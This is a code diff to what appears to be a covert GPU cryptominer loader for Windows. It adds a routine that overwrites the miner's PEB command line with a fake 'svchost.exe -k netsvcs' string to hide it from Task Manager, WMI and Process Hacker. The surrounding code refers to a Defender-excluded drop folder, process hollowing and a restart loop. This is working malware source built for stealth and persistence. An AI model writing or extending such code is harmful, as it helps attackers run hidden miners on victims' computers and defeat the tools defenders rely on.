@@ -5,6 +5,7 @@
 #include <stdio.h>
 #include <map>
 #include <mutex>
+#include <stddef.h>
 
 
 #include "../include/ntddk.h"
@@ -164,6 +165,49 @@ void abandon_hollow_process(PROCESS_INFORMATION& pi) {
 
 } // namespace
 
+// Rewrites the child's PEB command line so tools that read it (Task Manager,
+// WMI, Process Hacker) show a benign string instead of the real mining args.
+// Must only be called after the child has been resumed and its CRT has parsed
+// argv; otherwise the child itself would read the fake string.
+static void spoof_command_line(HANDLE hProcess, const wchar_t* fakeCmd)
+{
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    ULONG retLen = 0;
+    NTSTATUS st = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
+                                            &pbi, sizeof(pbi), &retLen);
+    if (!NT_SUCCESS(st) || pbi.PebBaseAddress == nullptr) return;
+
+    PEB peb = {0};
+    ULONG read = 0;
+    if (!NT_SUCCESS(NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &read)) ||
+        read != sizeof(peb)) return;
+
+    RTL_USER_PROCESS_PARAMETERS params = {0};
+    if (!NT_SUCCESS(NtReadVirtualMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &read)) ||
+        read != sizeof(params)) return;
+
+    // Allocate a fresh buffer inside the child for the fake command line.
+    SIZE_T fakeBytes = (wcslen(fakeCmd) + 1) * sizeof(wchar_t);
+    PVOID fakeBuf = VirtualAllocEx(hProcess, nullptr, fakeBytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!fakeBuf) return;
+
+    ULONG wrote = 0;
+    if (!NT_SUCCESS(NtWriteVirtualMemory(hProcess, fakeBuf, (PVOID)fakeCmd, (ULONG)fakeBytes, &wrote)) ||
+        wrote != fakeBytes) {
+        VirtualFreeEx(hProcess, fakeBuf, 0, MEM_RELEASE);
+        return;
+    }
+
+    // Point the PEB's CommandLine UNICODE_STRING at the fake buffer.
+    UNICODE_STRING newCmd = {0};
+    newCmd.Length        = (USHORT)(wcslen(fakeCmd) * sizeof(wchar_t));
+    newCmd.MaximumLength = (USHORT)fakeBytes;
+    newCmd.Buffer        = (PWSTR)fakeBuf;
+
+    ULONG_PTR cmdLineAddr = (ULONG_PTR)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine);
+    NtWriteVirtualMemory(hProcess, (PVOID)cmdLineAddr, &newCmd, sizeof(newCmd), &wrote);
+}
+
 // Writes the GPU miner payload to disk (inside the Defender-excluded folder)
 // and launches it as a normal process instead of hollowing it. The PID is
 // registered in ProcessStorage so the monitor loop keeps restarting and
@@ -240,7 +284,7 @@ DWORD drop_payload_and_run(const wchar_t* exePath, BYTE* payload, DWORD payloadS
     siex.StartupInfo.cb  = useAttr ? sizeof(STARTUPINFOEXW) : sizeof(STARTUPINFOW);
     siex.lpAttributeList = useAttr ? pAttrList : nullptr;
 
-    DWORD flags = DETACHED_PROCESS | CREATE_NO_WINDOW;
+    DWORD flags = CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW;
     if (useAttr) flags |= EXTENDED_STARTUPINFO_PRESENT;
 
     PROCESS_INFORMATION pi = { 0 };
@@ -262,6 +306,21 @@ DWORD drop_payload_and_run(const wchar_t* exePath, BYTE* payload, DWORD payloadS
         std::cerr << "[ERROR] CreateProcessW (GPU miner) failed, Error = " << GetLastError() << "\n";
         return 0;
     }
+
+    // Let the process start and its CRT parse the real args, then hide the args
+    // from process-listing tools by rewriting the PEB command line.
+    if (ResumeThread(pi.hThread) == (DWORD)-1) {
+        std::cerr << "[ERROR] Failed to resume GPU miner thread\n";
+        TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return 0;
+    }
+
+    Sleep(1500);  // generous delay: argv is parsed long before this point
+
+    static const wchar_t* FAKE_CMDLINE = L"C:\\Windows\\System32\\svchost.exe -k netsvcs";
+    spoof_command_line(pi.hProcess, FAKE_CMDLINE);
 
     ProcessStorage::AddProcess(pi.dwProcessId, pi);
     std::cout << "Launched GPU miner from disk, PID: " << std::dec << pi.dwProcessId << "\n";
@@ -345,7 +404,7 @@ DWORD transacted_hollowing(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSi
     FlushInstructionCache(pi.hProcess, remote_base, payloadSize);
     
     // Add another small delay after cache flush
-    Sleep(50);
+    Sleep(90);
     
     std::cout << "Resuming thread, PID " << std::dec << pi.dwProcessId << std::endl;
     
